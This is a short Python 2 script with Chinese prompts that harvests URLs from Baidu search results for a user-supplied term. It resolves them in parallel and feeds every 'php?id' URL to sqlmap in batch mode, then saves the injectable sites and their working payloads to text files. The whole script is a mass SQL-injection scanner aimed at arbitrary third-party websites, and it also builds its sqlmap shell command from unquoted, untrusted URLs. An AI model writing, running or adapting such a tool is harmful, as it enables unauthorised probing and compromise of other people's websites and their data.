#coding:utf-8
import search
from threadpool import *
import requests  
import os
import time
import random

oriURL = []
URL = []
result = []
resulturl = []
head = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17"}
def ThreadRun(u):
    try:
        #print u[6:-1]
        r = requests.get(u[6:-1],timeout=10,headers={'Connection':'close'})
        print r.url
        #r.connection.close()
        #print r.headers 
        #print requests.get(u[6:-1]).url
        URL.append(r.url)
    except Exception ,e:
        print Exception ,":" , e
        pass


def ThreadTest(u):
##    print u
    
    if 'php?id' in u:
        r = os.popen('C:\Users\Administrator\Desktop\sqltest\sqlmapproject-sqlmap-ab08273\sqlmap.py --batch --timeout 3 -u '+ u )
        text = r.read()
        if 'Parameter:' in text:
            resulturl.append(u)
            result.append(u +'\n' +text[text.find('Payload:'):text.find('---\n[')])
        #f.close()
        r.close()


#first:find url
searchText = raw_input("搜索内容是：")
pagenumber = raw_input("收集页面数量：")
a = search.BaiduSearchSpider(searchText ,pagenumber)
oriURL =a.baiduURLs()
print '收集了'+str(len(oriURL))+'个url'
print '第一步收集已经完成'


#second:find real url
print '正在获取真实url'.decode('UTF-8').encode('GBK')
pool = ThreadPool(50)
rrequests = makeRequests(ThreadRun,oriURL)
[pool.putRequest(req) for req in rrequests]
pool.wait()
print '真实url已经获取完毕'.decode('UTF-8').encode('GBK')

    
#thrid:pull to sqlmap to check
print '正在寻找存在漏洞网站'.decode('UTF-8').encode('GBK') 
pool = ThreadPool(20)
trrequests = makeRequests(ThreadTest,URL)
[pool.putRequest(req) for req in trrequests]
pool.wait()
print '测试完毕,正在写入文件'.decode('UTF-8').encode('GBK') 
f2 = open('result.txt','w')
result = list(set(result))
for i in result:
    f2.write('------------------------------------------')
    f2.write(i)
    f2.write('\n')
    f2.write('\n')
    #f.write('\n')
f2.close()

resulturl = list(set(resulturl))
f3 = open('resulturl.txt','w')
for iii in resulturl:
    f3.write(iii)
    f3.write('\n')
f3.close()

print '写入完毕'.decode('UTF-8').encode('GBK') 

